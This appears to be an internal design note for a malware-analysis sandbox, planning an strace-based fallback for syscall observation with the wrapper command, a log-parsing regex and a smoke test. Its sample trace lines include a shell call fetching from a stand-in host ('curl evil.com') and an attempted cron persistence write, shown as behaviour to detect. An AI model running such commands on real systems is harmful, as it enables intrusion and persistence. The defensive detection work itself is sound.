# Sandbox observability Option B — strace fallback

**Purpose:** standby plan if Option A (kprobe-based bpftrace) also
fails on Fly Firecracker's kernel. Documents the strace-based path
so the pivot is fast (~half-day eng) when needed, not improvised
under pressure.

**Trigger condition:** v7 smoke test shows
`syscall_observability_error` events with `kprobe not found` or
similar. If kprobes work, this plan is not needed.

## Why strace works where bpftrace doesn't

bpftrace requires kernel-level tracing infrastructure
(`CONFIG_TRACEPOINTS`, `CONFIG_KPROBES`, etc.). Fly Firecracker's
stripped kernel has chosen to omit these to minimize attack surface
and image size.

**strace** uses **`ptrace(2)`** — a fundamental Linux syscall present
since the 1990s. Every Linux kernel supports it because debuggers
(gdb, lldb) depend on it. `ptrace` is the foundation, not an
optional tracing subsystem.

The cost: ptrace stops the traced process at every syscall (twice —
once entering, once exiting), context-switches to the tracer, copies
syscall args, switches back. Overhead ~30% on busy paths. We accept
that as the cost of kernel-config independence.

## Implementation

### 1. Dockerfile change

`Dockerfile.lean`: add `strace` to the apt install list (~3 MB).
bpftrace can stay too — it'll graceful-fail on this kernel and we
keep the code for when Fly's kernel gets fuller support.

### 2. Replace the bpftrace sidecar in `dast-init.sh`

Today:

```bash
bpftrace /usr/local/lib/argus-syscalls.bt \
    >/tmp/syscalls.jsonl 2>/tmp/bpftrace.err &
# ... later: exec runuser -u runner -- python3 /usr/local/bin/dast-entrypoint
```

New (strace WRAPS the runuser exec instead of running as sidecar):

```bash
exec strace -f \
    -e trace=execve,execveat,openat,openat2,connect,socket,mmap,mprotect,setuid,setgid,capset,unshare,prctl,ptrace,init_module,finit_module,clone,clone3 \
    -e signal=none \
    --absolute-timestamps=us \
    --decode-fds=path,socket \
    --output=/tmp/strace.log \
    --string-limit=200 \
    -- \
    runuser --preserve-environment -u runner -- python3 /usr/local/bin/dast-entrypoint
```

Key flags:
- `-f` — follow forks (Gap 5: process tree)
- `-e trace=<list>` — only the syscalls we care about (filters volume)
- `-e signal=none` — don't log signals (volume reduction)
- `--decode-fds=path,socket` — show file paths + socket addresses
  inline rather than just FD numbers (huge for Gap 2 + Gap 3)
- `--string-limit=200` — truncate string args to 200 chars (prevent
  oversize lines)
- `--output=/tmp/strace.log` — file path; entrypoint drains at end
- `--absolute-timestamps=us` — microsecond precision for timeline

### 3. Parser change

`dast/syscall_observability.py` gets a parallel input path:
`parse_strace_log(content: str) -> SyscallObservations`. Same output
shape; entrypoint.py decides which parser based on which file exists
(`/tmp/strace.log` vs `/tmp/syscalls.jsonl`).

strace output format (sample):

```
[pid 123] 1234.567890 openat(AT_FDCWD, "/etc/cron.d/argus_persist_test", O_WRONLY|O_CREAT|O_TRUNC, 0644) = -1 EACCES (Permission denied)
[pid 123] 1234.567950 execve("/bin/sh", ["sh", "-c", "curl evil.com"], 0x7fff...) = 0
```

Per-line regex:
```
^\[pid (?P<pid>\d+)\]\s+(?P<ts>\S+)\s+(?P<syscall>\w+)\((?P<args>.*?)\)\s*=\s*(?P<ret>\S+)(?:\s+(?P<errno>\w+))?
```

Key advantages over bpftrace:
- **Filenames inline** (no userspace pointer dereference needed)
- **Connect destinations inline** (sockaddr_in resolved to "127.0.0.1:80")
- **Return code visible** — we can distinguish successful writes
  from EACCES attempts at parse time (vs Gap 2's "we know the
  attempt happened but not the outcome" today)
- **Errno on failure** — Stage 2 prompt can say "openat returned
  EACCES — target wanted to write here but lacked permission"

### 4. Entrypoint.py drain

Replace the `/tmp/syscalls.jsonl` JSON-line parse with a strace-log
line parse. Emits the same `syscall_observations` event shape — the
orchestrator + prompt template are unchanged.

### 5. Smoke test

Same target file (`argus_syscall_smoketest.js`). Expected outcome:

```
[pid X] openat(AT_FDCWD, "/etc/cron.d/argus_persist_test", O_WRONLY|O_CREAT, 0644) = -1 EACCES (Permission denied)
[pid X] execve("/bin/sh", ["sh", "-c", "chromedriver --action=... --target=..."], ...) = 0
```

Both lines surface as `syscall_observations` event with:
- `exec_observed=True`
- `write_target_paths=["/etc/cron.d/argus_persist_test"]`
- `non_localhost_connects` populated (curl to whatever)

Then `BehavioralProfile.syscall_observations` populated, Stage 2
prompt renders the section, Sonnet nominates a persistence-mechanism
hypothesis. Verdict should differ from baseline (clean → malicious).

## Trade-offs vs Option A (bpftrace)

| Dimension | bpftrace (A) | strace (B) |
|---|---|---|
| Overhead | ~5% | ~30% |
| Kernel config dep | Heavy (tracepoints/kprobes) | None (ptrace is universal) |
| Image bloat | ~30 MB | ~3 MB |
| Per-syscall arg detail | Limited (args harder to dereference) | Excellent (strace knows ABI) |
| Process tree | Via clone() kprobe + parent attribution | Native via `-f` |
| Failure mode | Silent error if kprobe missing | Always works |
| Maintenance | Lower (declarative bpftrace script) | Lower (mature `strace -e` flags) |

**The 30% overhead is the real cost.** For a 60s plan budget, that's
~18s extra wall-clock on busy plans. For Stage 1 behavioral probes
that exercise MAX_CALLABLES_EXPLORED × MAX_INVOCATIONS callables,
the overhead stacks up. May need to bump timeouts.

## Decision rule

After v7 smoke test:

- **bpftrace + kprobes works** (events captured, signal reaches
  model, verdict reflects new hypothesis) → ship A, archive this
  doc as "not needed"
- **bpftrace + kprobes fails** (`Could not find tracepoint matching:
  kprobe:__x64_sys_*`) → implement B per this plan, ~half-day work
- **bpftrace silent failure** (no error but no events either) → debug
  more before pivoting

## Effort estimate for B

- Dockerfile change: 1 line, 5 min
- dast-init.sh rewrite: ~30 min (replace bpftrace launch with
  strace wrap)
- strace log parser: ~3 hours (regex per line, errno handling,
  process tree reconstruction)
- Entrypoint.py drain swap: ~1 hour
- Parser unit tests: ~2 hours (~20 tests against fixture log lines)
- Image rebuild as v8: ~10 min
- Smoke test: ~10 min
- **Total: ~half day**

## Other fallback options NOT taken

| Option | Why rejected |
|---|---|
| **eBPF via raw kernel programs (no bpftrace wrapper)** | Same kernel-config dependency as bpftrace; doesn't solve the problem |
| **LD_PRELOAD shim on libc** | Bypassable via direct syscall (Gap 1 not closed); doesn't survive execve() |
| **Run sandbox in nested VM with custom kernel** | 10x infra complexity, latency budget killed |
| **Switch from Fly Firecracker to e.g. gVisor** | Major platform migration; out of scope |
| **Self-host Firecracker with full kernel** | Massive ops increase; out of scope |
| **Audit subsystem (auditd)** | Same kernel-config story (CONFIG_AUDIT, CONFIG_AUDITSYSCALL); likely also missing |
